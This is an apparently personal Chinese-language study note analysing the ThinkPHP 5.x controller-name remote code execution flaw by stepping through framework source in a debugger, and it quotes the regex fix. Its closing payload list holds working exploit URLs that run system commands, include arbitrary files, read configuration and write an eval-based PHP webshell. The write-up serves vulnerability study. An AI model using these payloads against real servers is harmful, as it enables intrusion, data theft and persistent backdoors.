# 影响版本

- ThinkPHP 5.0.8-5.0.22
- ThinkPHP 5.1.0-5.1.30

# 复现前提

5.0.8~5.0.12版本不需要开启debug模式
5.0.13~5.0.23复现前要保证开启了debug模式（默认是关闭的）

![image-20210913232818428](images/1.png)

不过我用的5.0.15没开启debug也复现成功了

# 环境搭建

thinkphp5.0.15的下载地址

[http://www.thinkphp.cn/donate/download/id/...](http://www.thinkphp.cn/donate/download/id/1125.html)

# 漏洞分析

版本:tp5.0.15

入口点在public目录下的index.php

![image-20210914182503756](images/2.png)

打个断点,一路F7,可以跟到app.php下的run方法

![image-20210914182632932](images/3.png)

执行到run()后,f8执行函数内部,这样遇到函数不会跳转,一直执行到路由检测部分

$dispatch未赋初值,可以看到能够执行到routeCheck()函数

![image-20210914221203559](images/4.png)

跟进routeCheck()

```
public static function routeCheck($request, array $config)
    {
        $path   = $request->path();
        $depr   = $config['pathinfo_depr'];
        $result = false;

        // 路由检测
        $check = !is_null(self::$routeCheck) ? self::$routeCheck : $config['url_route_on'];
        if ($check) {
            // 开启路由
            if (is_file(RUNTIME_PATH . 'route.php')) {
                // 读取路由缓存
                $rules = include RUNTIME_PATH . 'route.php';
                is_array($rules) && Route::rules($rules);
            } else {
                $files = $config['route_config_file'];
                foreach ($files as $file) {
                    if (is_file(CONF_PATH . $file . CONF_EXT)) {
                        // 导入路由配置
                        $rules = include CONF_PATH . $file . CONF_EXT;
                        is_array($rules) && Route::import($rules);
                    }
                }
            }

            // 路由检测（根据路由定义返回不同的URL调度）
            $result = Route::check($request, $path, $depr, $config['url_domain_deploy']);
            $must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];

            if ($must && false === $result) {
                // 路由无效
                throw new RouteNotFoundException();
            }
        }

        // 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索
        if (false === $result) {
            $result = Route::parseUrl($path, $depr, $config['controller_auto_search']);
        }

        return $result;
    }
```

根据debug界面看到了$request的值是think\request,去调用里面的path()

![image-20210915150818107](images/5.png)

跟进path()

![image-20210915151053499](images/6.png)

因为打着断点,可以看到能够进入pathinfo(),跟进pathinfo

而且这个函数的返回值都是和`$pathinfo`相关的,去看看怎么获取的`$pathinfo`

![image-20210915153033338](images/7.png)

这个函数末尾的返回值是

```
return $this->pathinfo;
```

根据debug可以看到,最后的值是通过URL来获取的,并且是`"var_config"`的值,在debug界面可以看到,get的值应该是s,那么传参形式应该是`?s`

将$pathinfo的传入的值赋值为:`index/\think\app/invokefunction`

回到path函数

![image-20210915161343628](images/8.png)

发现`$pathinfo`还需要去进行一些处理才能得到`$this->path`

回到routeCheck()

![image-20210915161529741](images/9.png)

看到虽然$path会经过一些处理,但是还是返回了我们url传入的index/\think\app/invokefunction

从routeCheck()继续往下走进入到一个check函数

![image-20210915162117633](images/10.png)

该方法的返回值是false,即$result=false

接下来会有一个判断:

```
//是否强制路由
$must   = !is_null(self::$routeMust) ? self::$routeMust : $config['url_route_must'];
```

如果开启了强制路由，那么我们输入的路由将报错导致后面导致程序无法运行，也就不存在RCE漏洞，我用的版本默认是关闭的,如果拿payload打不通的话可以看看强制路由是否开启

接下来会进入一个if

![image-20210915164237709](images/11.png)

跟进paraseUrl

```
public static function parseUrl($url, $depr = '/', $autoSearch = false)
    {

        if (isset(self::$bind['module'])) {
            $bind = str_replace('/', $depr, self::$bind['module']);
            // 如果有模块/控制器绑定
            $url = $bind . ('.' != substr($bind, -1) ? $depr : '') . ltrim($url, $depr);
        }
        $url              = str_replace($depr, '|', $url);
        list($path, $var) = self::parseUrlPath($url);
        $route            = [null, null, null];
        if (isset($path)) {
            // 解析模块
            $module = Config::get('app_multi_module') ? array_shift($path) : null;
            if ($autoSearch) {
                // 自动搜索控制器
                $dir    = APP_PATH . ($module ? $module . DS : '') . Config::get('url_controller_layer');
                $suffix = App::$suffix || Config::get('controller_suffix') ? ucfirst(Config::get('url_controller_layer')) : '';
                $item   = [];
                $find   = false;
                foreach ($path as $val) {
                    $item[] = $val;
                    $file   = $dir . DS . str_replace('.', DS, $val) . $suffix . EXT;
                    $file   = pathinfo($file, PATHINFO_DIRNAME) . DS . Loader::parseName(pathinfo($file, PATHINFO_FILENAME), 1) . EXT;
                    if (is_file($file)) {
                        $find = true;
                        break;
                    } else {
                        $dir .= DS . Loader::parseName($val);
                    }
                }
                if ($find) {
                    $controller = implode('.', $item);
                    $path       = array_slice($path, count($item));
                } else {
                    $controller = array_shift($path);
                }
            } else {
                // 解析控制器
                $controller = !empty($path) ? array_shift($path) : null;
            }
            // 解析操作
            $action = !empty($path) ? array_shift($path) : null;
            // 解析额外参数
            self::parseUrlParams(empty($path) ? '' : implode('|', $path));
            // 封装路由
            $route = [$module, $controller, $action];
            // 检查地址是否被定义过路由
            $name  = strtolower($module . '/' . Loader::parseName($controller, 1) . '/' . $action);
            $name2 = '';
            if (empty($module) || isset($bind) && $module == $bind) {
                $name2 = strtolower(Loader::parseName($controller, 1) . '/' . $action);
            }

            if (isset(self::$rules['name'][$name]) || isset(self::$rules['name'][$name2])) {
                throw new HttpException(404, 'invalid request:' . str_replace('|', $depr, $url));
            }
        }
        return ['type' => 'module', 'module' => $route];
    }
```

他会将url中的`/`替换成`|`

接下来跟进parseUrlPath()

![image-20210915164508901](images/12.png)

他又将被替换成`|`的`/`替换回了`/`

并且将`$url`按照/分割成了数组存放在`$path`中

```
$path = explode('/', $url);
```

回到passUrl()中

将`$path`中的内容存到了`$moudle`、`$controller`、`$action`

最后返回给了routeCheck()的$result中

退出routeCheck()后dispatch的值

![image-20210915165109849](images/13.png)

在run()中继续跟进,跟进到了

```
$data = self::exec($dispatch, $config);
```

进入exec()

![image-20210915165933436](images/14.png)

看到应该进入module分支

跟进module()函数

这个函数的返回值:

```
return self::invokeMethod($call, $vars);
```

跟进invokerMethod()

```
public static function invokeMethod($method, $vars = [])
{
    if (is_array($method)) {
        $class   = is_object($method[0]) ? $method[0] : self::invokeClass($method[0]);
        $reflect = new \ReflectionMethod($class, $method[1]);
    } else {
        // 静态方法
        $reflect = new \ReflectionMethod($method);
    }

    $args = self::bindParams($reflect, $vars);

    self::$debug && Log::record('[ RUN ] ' . $reflect->class . '->' . $reflect->name . '[ ' . $reflect->getFileName() . ' ]', 'info');

    return $reflect->invokeArgs(isset($class) ? $class : null, $args);
}
```

跟进bindParams()

```
private static function bindParams($reflect, $vars = [])
{
    // 自动获取请求变量
    if (empty($vars)) {
        $vars = Config::get('url_param_type') ?
        Request::instance()->route() :
        Request::instance()->param();
    }

    $args = [];
    if ($reflect->getNumberOfParameters() > 0) {
        // 判断数组类型 数字数组时按顺序绑定参数
        reset($vars);
        $type = key($vars) === 0 ? 1 : 0;

        foreach ($reflect->getParameters() as $param) {
            $args[] = self::getParamValue($param, $vars, $type);
        }
    }

    return $args;
}
```

```
 $vars = Config::get('url_param_type') ?
```

这一行将url中剩余的参数保存到了`$var`里面

![image-20210916223329421](images/15.png)

然后通过foreach将传入的危险函数逐个存储在`$args`中,最后返回给invokeMethod()

![image-20210916223358366](images/16.png)

回到invokeMethod()最后一行

```
return $reflect->invokeArgs(isset($class) ? $class : null, $args);
```

如果控制器的名字中存在 `\`或者以`\`开头，会被会被当作一个类，可以利用命名空间，实例化任意类

![image-20210916221516273](images/17.png)

这里通过反射的方式去调用invokeFunction()

```
public static function invokeFunction($function, $vars = [])
    {
        $reflect = new \ReflectionFunction($function);
        $args    = self::bindParams($reflect, $vars);

        // 记录执行信息
        self::$debug && Log::record('[ RUN ] ' . $reflect->__toString(), 'info');

        return $reflect->invokeArgs($args);
    }
```

invokeFunction()能调用动态调用函数,从而去实现RCE

![image-20210916223428364](images/18.png)

最后回到exec()看到debug出发现可以成功RCE



# payload

**5.0.x**

```
?s=index/think\config/get&name=database.username # 获取配置信息
?s=index/\think\Lang/load&file=../../test.jpg    # 包含任意文件
?s=index/\think\Config/load&file=../../t.php     # 包含任意.php文件
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=whoami
```

**5.1.x**

```
?s=index/\think\Request/input&filter[]=system&data=pwd
?s=index/\think\view\driver\Php/display&content=<?php phpinfo();?>
?s=index/\think\template\driver\file/write&cacheFile=shell.php&content=<?php phpinfo();?>
?s=index/\think\Container/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
?s=/index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=shell2.php&vars[1][]=<?php eval($_POST[xm]);?>
```

在修复的版本中,在App.php中添加了一段正则匹配代码

```
if (!preg_match('/^[A-Za-z](\w|\.)*$/', $controller)) {
       throw new HttpException(404, 'controller not exists:' . $controller);
   }
```

开始用composer搭建的环境也莫名其妙就下到了5.0.24的版本,存在这个补丁,payload一直打不通

这个rce漏洞总的来说就是因为把控制器名字的 `\` 开头作为类名导致我们可以实例化任意类





# 后记

不过这个洞学的并不是很清楚,对一些地方的控制还是不太清楚,因为版本和网上的有些不同,部分地方代码不太一样,等后面去重新复现一下与他们相同的版本,所以感觉写的会有一些乱

学习到了断点的打法,打断点对漏洞分析真的很有用

先记下一些payload,等到后面把断点调试熟练之后再来做一遍这个洞和larave5.7的反序列化

参考链接:

http://47.100.93.13/index.php/archives/971/

https://xz.aliyun.com/t/9361#toc-7

https://xz.aliyun.com/t/8312#toc-0

